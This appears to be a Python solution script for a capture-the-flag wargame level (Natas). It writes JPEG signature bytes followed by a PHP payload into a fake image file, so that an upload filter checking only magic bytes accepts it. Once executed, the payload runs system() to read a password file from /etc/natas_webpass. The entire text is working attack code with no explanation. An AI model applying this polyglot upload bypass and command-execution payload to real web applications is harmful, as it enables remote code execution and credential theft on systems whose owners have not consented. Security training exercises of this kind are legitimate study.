import base64

jpg_signature = 'ffd8 ffe1 0064 4578 6966 0000 4d4d 002a'

jpg_signature_hex = bytes.fromhex(jpg_signature)

print(jpg_signature_hex)

# code = b'<?php echo "Hello world!"; ?>'
code = b'<?php system("cat /etc/natas_webpass/natas14"); ?>'

with open('natas14payload.jpg', 'wb') as f:
    f.write(jpg_signature_hex + code)


